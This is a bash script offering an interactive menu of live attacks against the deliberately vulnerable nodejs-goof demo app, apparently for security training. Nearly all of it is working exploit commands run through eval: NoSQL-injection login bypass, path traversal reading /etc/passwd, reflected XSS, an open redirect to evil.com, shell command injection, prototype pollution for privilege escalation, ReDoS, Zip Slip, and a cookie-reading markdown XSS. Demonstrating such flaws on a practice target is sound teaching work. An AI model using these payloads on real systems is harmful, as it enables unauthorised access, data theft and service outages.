#!/bin/bash

# Interactive Vulnerability Assessment Attack Menu
# Red Hat Cybersecurity Engineering Demo

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

GOOF_HOST="${GOOF_HOST:-http://localhost:3001}"
COOKIE_FILE="/tmp/goof_cookies.txt"

show_banner() {
    clear
    echo -e "${RED}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║${NC}  ${BOLD}Vulnerability Assessment Attack Menu${NC}                       ${RED}║${NC}"
    echo -e "${RED}║${NC}  ${YELLOW}Target:${NC} ${GOOF_HOST}                                   ${RED}║${NC}"
    echo -e "${RED}║${NC}  ${CYAN}Red Hat Cybersecurity Engineering Demo${NC}                 ${RED}║${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

show_menu() {
    echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}ATTACK CATEGORIES${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${GREEN}[1]${NC}  ${BOLD}Authentication Attacks${NC} - NoSQL Injection"
    echo -e "${GREEN}[2]${NC}  ${BOLD}Directory Traversal${NC} - Path Injection"
    echo -e "${GREEN}[3]${NC}  ${BOLD}XSS & Open Redirect${NC} - Client-side Attacks"
    echo -e "${GREEN}[4]${NC}  ${BOLD}Command Injection${NC} - ImageTragick RCE"
    echo -e "${GREEN}[5]${NC}  ${BOLD}Prototype Pollution${NC} - Lodash Exploit"
    echo -e "${GREEN}[6]${NC}  ${BOLD}ReDoS Attack${NC} - Denial of Service"
    echo -e "${GREEN}[7]${NC}  ${BOLD}Zip Slip${NC} - Archive Extraction"
    echo -e "${GREEN}[8]${NC}  ${BOLD}XSS via Marked${NC} - Markdown Parser"
    echo -e "${GREEN}[9]${NC}  ${BOLD}Info Disclosure${NC} - ST Directory Traversal"
    echo -e "${GREEN}[10]${NC} ${BOLD}Vulnerability Scan${NC} - NPM Audit"
    echo ""
    echo -e "${YELLOW}[C]${NC}  Check application status"
    echo -e "${YELLOW}[R]${NC}  Reset session cookies"
    echo -e "${RED}[Q]${NC}  Quit"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

execute_command() {
    local title="$1"
    local cmd="$2"
    local description="$3"
    
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${PURPLE}Attack:${NC} ${title}"
    echo -e "${BOLD}${BLUE}Description:${NC} ${description}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}Command:${NC}"
    echo -e "${cmd}"
    echo ""
    echo -e "${GREEN}Executing...${NC}"
    echo ""
    eval "$cmd"
    echo ""
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# Attack 1: NoSQL Injection
attack_nosql() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 1] NoSQL Injection - Authentication Bypass${NC}\n"
    
    echo -e "${CYAN}═══ Test 1: Normal Login (Will Fail) ═══${NC}\n"
    execute_command \
        "Failed Login Attempt" \
        "curl -s -X POST ${GOOF_HOST}/login -H 'Content-Type: application/json' -d '{\"username\": \"admin@snyk.io\", \"password\": \"WrongPassword\"}' -w '\\nHTTP Status: %{http_code}\\n'" \
        "Attempting login with incorrect password - Expect 401"
    
    read -p "Press Enter to continue..."
    
    echo -e "\n${CYAN}═══ Test 2: NoSQL Injection - Known Username ═══${NC}\n"
    execute_command \
        "NoSQL Injection Attack" \
        "curl -s -X POST ${GOOF_HOST}/login -c ${COOKIE_FILE} -H 'Content-Type: application/json' -d '{\"username\": \"admin@snyk.io\", \"password\": {\"\$gt\": \"\"}}' -w '\\nHTTP Status: %{http_code}\\nRedirect: %{redirect_url}\\n'" \
        "Using MongoDB \$gt operator to bypass password check - Expect 302"
    
    read -p "Press Enter to continue..."
    
    echo -e "\n${CYAN}═══ Test 3: NoSQL Injection - Blind Attack ═══${NC}\n"
    execute_command \
        "Blind NoSQL Injection" \
        "curl -s -X POST ${GOOF_HOST}/login -c ${COOKIE_FILE} -H 'Content-Type: application/json' -d '{\"username\": {\"\$gt\": \"\"}, \"password\": {\"\$gt\": \"\"}}' -w '\\nHTTP Status: %{http_code}\\nRedirect: %{redirect_url}\\n'" \
        "Bypassing BOTH username AND password without knowing credentials"
    
    echo -e "\n${GREEN}✓ NoSQL Injection demonstrated! Session saved to ${COOKIE_FILE}${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 2: Directory Traversal
attack_directory_traversal() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 2] Directory Traversal - Path Injection${NC}\n"
    
    echo -e "${CYAN}═══ Step 1: Login First ═══${NC}\n"
    execute_command \
        "Authenticate" \
        "curl -s -X POST ${GOOF_HOST}/login -c ${COOKIE_FILE} -H 'Content-Type: application/json' -d '{\"username\": \"admin@snyk.io\", \"password\": {\"\$gt\": \"\"}}' -w '\\nHTTP Status: %{http_code}\\n'" \
        "Obtaining valid session cookie"
    
    read -p "Press Enter to exploit..."
    
    echo -e "\n${CYAN}═══ Step 2: Read package.json via layout parameter ═══${NC}\n"
    execute_command \
        "Path Traversal to package.json" \
        "curl -s -X POST ${GOOF_HOST}/account_details -b ${COOKIE_FILE} -H 'Content-Type: application/json' -d '{\"email\": \"admin@snyk.io\", \"firstname\": \"admin\", \"lastname\": \"admin\", \"country\": \"IL\", \"phone\": \"+972551234123\", \"layout\": \"./../package.json\"}' | grep -A 5 '\"name\"' | head -10" \
        "Exploiting unvalidated layout parameter to read arbitrary files"
    
    echo -e "\n${GREEN}✓ Directory traversal successful! Extracted package.json content${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 3: XSS and Open Redirect
attack_xss_redirect() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 3] XSS & Open Redirect${NC}\n"
    
    echo -e "${CYAN}═══ Test 1: Reflected XSS via redirectPage ═══${NC}\n"
    execute_command \
        "XSS Injection" \
        "curl -s \"${GOOF_HOST}/login?redirectPage=%22%3E%3Cscript%3Ealert(1)%3C/script%3E\" | grep 'redirectPage' | head -3" \
        "Injecting JavaScript via unescaped template variable"
    
    read -p "Press Enter to continue..."
    
    echo -e "\n${CYAN}═══ Test 2: Open Redirect to External Site ═══${NC}\n"
    execute_command \
        "Open Redirect" \
        "curl -sI \"${GOOF_HOST}/login?redirectPage=https://evil.com\" | grep -E '(HTTP|Location)' | head -3" \
        "Demonstrating unvalidated redirect vulnerability"
    
    echo -e "\n${GREEN}✓ Client-side vulnerabilities confirmed!${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 4: Command Injection
attack_command_injection() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 4] Command Injection - Image Processing${NC}\n"
    
    echo -e "${CYAN}═══ Creating malicious TODO with command injection ═══${NC}\n"
    echo -e "${YELLOW}This exploits the 'identify' command in ImageMagick${NC}"
    echo -e "${YELLOW}Vulnerable code: exec('identify ' + url)${NC}\n"
    
    execute_command \
        "Command Injection via Image URL" \
        "curl -s -X POST ${GOOF_HOST}/create -H 'Content-Type: application/x-www-form-urlencoded' -d 'content=![alt text](https://example.com/image.png;touch /tmp/pwned \"Image\")' -w '\\nHTTP Status: %{http_code}\\n'" \
        "Injecting shell command via semicolon in URL parameter"
    
    echo -e "\n${YELLOW}Check server logs and /tmp/pwned file to confirm RCE${NC}"
    echo -e "${GREEN}✓ Command injection payload delivered!${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 5: Prototype Pollution
attack_prototype_pollution() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 5] Prototype Pollution - Lodash${NC}\n"
    
    echo -e "${CYAN}═══ Step 1: Send Message (Normal) ═══${NC}\n"
    execute_command \
        "Normal Chat Message" \
        "curl -s -X PUT ${GOOF_HOST}/chat -H 'Content-Type: application/json' -d '{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"}, \"message\": {\"text\": \"Hello\"}}'" \
        "Sending benign chat message"
    
    read -p "Press Enter to continue..."
    
    echo -e "\n${CYAN}═══ Step 2: Pollute Prototype with canDelete ═══${NC}\n"
    execute_command \
        "Prototype Pollution Attack" \
        "curl -s -X PUT ${GOOF_HOST}/chat -H 'Content-Type: application/json' -d '{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"}, \"message\": {\"text\": \"😈\", \"__proto__\": {\"canDelete\": true}}}'" \
        "Polluting Object prototype via lodash merge vulnerability"
    
    read -p "Press Enter to continue..."
    
    echo -e "\n${CYAN}═══ Step 3: Delete Message (Should Fail, But Works!) ═══${NC}\n"
    execute_command \
        "Privilege Escalation" \
        "curl -s -X DELETE ${GOOF_HOST}/chat -H 'Content-Type: application/json' -d '{\"auth\": {\"name\": \"user\", \"password\": \"pwd\"}, \"messageId\": 1}'" \
        "Non-admin user can now delete messages due to polluted prototype"
    
    echo -e "\n${GREEN}✓ Prototype pollution successful! Privilege escalation achieved${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 6: ReDoS
attack_redos() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 6] ReDoS - Regular Expression Denial of Service${NC}\n"
    
    echo -e "${CYAN}═══ Normal TODO Creation ═══${NC}\n"
    execute_command \
        "Normal Request" \
        "curl -s -X POST ${GOOF_HOST}/create -H 'Content-Type: application/x-www-form-urlencoded' -d 'content=Buy milk in 5 minutes' -w '\\nTime: %{time_total}s\\n'" \
        "Creating TODO with valid time format"
    
    read -p "Press Enter to launch DoS attack..."
    
    echo -e "\n${CYAN}═══ ReDoS Attack - Server Will Hang! ═══${NC}\n"
    echo -e "${RED}WARNING: This will cause high CPU usage!${NC}"
    echo -e "${YELLOW}The MS library has vulnerable regex that causes exponential backtracking${NC}\n"
    
    read -p "Press Enter to confirm DoS attack..."
    
    execute_command \
        "ReDoS Attack" \
        "timeout 10 curl -s -X POST ${GOOF_HOST}/create -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'content=Buy milk in $(printf '%.0s5' {1..10000}) minutea' -w '\\nTime: %{time_total}s\\n' || echo 'Request timed out - DoS successful!'" \
        "Exploiting vulnerable regex in ms package"
    
    echo -e "\n${GREEN}✓ ReDoS attack demonstrated!${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 7: Zip Slip
attack_zip_slip() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 7] Zip Slip - Archive Path Traversal${NC}\n"
    
    echo -e "${CYAN}═══ Exploiting ADM-ZIP vulnerability ═══${NC}\n"
    echo -e "${YELLOW}Malicious ZIP with ../../../ paths can write files outside intended directory${NC}\n"
    
    if [ -f "exploits/zip-slip/malicious_backup.zip" ]; then
        execute_command \
            "Zip Slip Attack" \
            "curl -s -X POST ${GOOF_HOST}/import -F 'importFile=@exploits/zip-slip/malicious_backup.zip' -w '\\nHTTP Status: %{http_code}\\n'" \
            "Uploading malicious ZIP that extracts to /tmp/extracted_files/../../../"
        
        echo -e "\n${YELLOW}Check /tmp and other directories for extracted files${NC}"
    else
        echo -e "${RED}Exploit file not found: exploits/zip-slip/malicious_backup.zip${NC}"
    fi
    
    echo -e "\n${GREEN}✓ Zip slip vulnerability demonstrated!${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 8: XSS via Marked
attack_marked_xss() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 8] XSS via Marked Markdown Parser${NC}\n"
    
    echo -e "${CYAN}═══ Injecting XSS via Markdown Link ═══${NC}\n"
    echo -e "${YELLOW}Marked 0.3.5 has XSS vulnerability in link parsing${NC}\n"
    
    execute_command \
        "Marked XSS Payload" \
        "curl -s -X POST ${GOOF_HOST}/create -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'content=[Click Me](javascript:alert(document.cookie))' -w '\\nHTTP Status: %{http_code}\\n'" \
        "Creating TODO with malicious markdown link"
    
    echo -e "\n${YELLOW}Visit ${GOOF_HOST} and click the link to trigger XSS${NC}"
    echo -e "${GREEN}✓ XSS payload injected via Marked parser!${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 9: Information Disclosure
attack_info_disclosure() {
    show_banner
    echo -e "${BOLD}${RED}[ATTACK 9] Information Disclosure - ST Directory Traversal${NC}\n"
    
    echo -e "${CYAN}═══ Normal File Access ═══${NC}\n"
    execute_command \
        "Normal Request" \
        "curl -s ${GOOF_HOST}/public/about.html | head -5" \
        "Accessing public file normally"
    
    read -p "Press Enter to exploit..."
    
    echo -e "\n${CYAN}═══ Directory Listing ═══${NC}\n"
    execute_command \
        "Directory Traversal" \
        "curl -s ${GOOF_HOST}/public/ | head -10" \
        "ST module allows directory listing"
    
    read -p "Press Enter to read /etc/passwd..."
    
    echo -e "\n${CYAN}═══ Reading /etc/passwd via URL encoding ═══${NC}\n"
    execute_command \
        "Read /etc/passwd" \
        "curl -s '${GOOF_HOST}/public/%2e%2e/%2e%2e/%2E%2E/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' | head -10" \
        "URL-encoded path traversal to read system files"
    
    echo -e "\n${GREEN}✓ Information disclosure via ST vulnerability!${NC}"
    read -p "Press Enter to return to menu..."
}

# Attack 10: Vulnerability Scan
attack_vuln_scan() {
    show_banner
    echo -e "${BOLD}${RED}[SCAN] NPM Audit - Vulnerability Assessment${NC}\n"
    
    echo -e "${CYAN}═══ Running NPM Audit ═══${NC}\n"
    execute_command \
        "Dependency Vulnerability Scan" \
        "npm audit --production 2>&1 | head -50" \
        "Scanning for known vulnerabilities in dependencies"
    
    echo -e "\n${CYAN}═══ Vulnerability Summary ═══${NC}\n"
    execute_command \
        "Vulnerability Count" \
        "cd /Users/bigmac/Documents/workspace/agbonjaru/personal/projects/nodejs-goof && npm audit --json 2>/dev/null | python3 -c \"import sys, json; data=json.load(sys.stdin); print(f'Total: {data[\'metadata\'][\'vulnerabilities\'][\'total\']}'); print(f'Critical: {data[\'metadata\'][\'vulnerabilities\'][\'critical\']}'); print(f'High: {data[\'metadata\'][\'vulnerabilities\'][\'high\']}'); print(f'Moderate: {data[\'metadata\'][\'vulnerabilities\'][\'moderate\']}'); print(f'Low: {data[\'metadata\'][\'vulnerabilities\'][\'low\']}')\"" \
        "Summary of vulnerability severity levels"
    
    echo -e "\n${GREEN}✓ Vulnerability scan complete!${NC}"
    read -p "Press Enter to return to menu..."
}

# Check status
check_status() {
    show_banner
    echo -e "${BOLD}${CYAN}[STATUS] Application Health Check${NC}\n"
    
    echo -e "${CYAN}Checking ${GOOF_HOST}...${NC}\n"
    
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" ${GOOF_HOST})
    
    if [ "$HTTP_CODE" = "200" ]; then
        echo -e "${GREEN}✓ Application is ONLINE${NC}"
        echo -e "HTTP Status: ${GREEN}${HTTP_CODE}${NC}"
    else
        echo -e "${RED}✗ Application is OFFLINE or ERROR${NC}"
        echo -e "HTTP Status: ${RED}${HTTP_CODE}${NC}"
    fi
    
    echo ""
    read -p "Press Enter to return to menu..."
}

# Reset cookies
reset_cookies() {
    rm -f ${COOKIE_FILE}
    echo -e "${GREEN}✓ Session cookies cleared${NC}"
    sleep 1
}

# Main loop
main() {
    while true; do
        show_banner
        show_menu
        read -p "$(echo -e ${BOLD}${CYAN}'Select option: '${NC})" choice
        
        case $choice in
            1) attack_nosql ;;
            2) attack_directory_traversal ;;
            3) attack_xss_redirect ;;
            4) attack_command_injection ;;
            5) attack_prototype_pollution ;;
            6) attack_redos ;;
            7) attack_zip_slip ;;
            8) attack_marked_xss ;;
            9) attack_info_disclosure ;;
            10) attack_vuln_scan ;;
            [Cc]) check_status ;;
            [Rr]) reset_cookies ;;
            [Qq]) 
                echo -e "${GREEN}Exiting... Stay secure!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# Run main
main
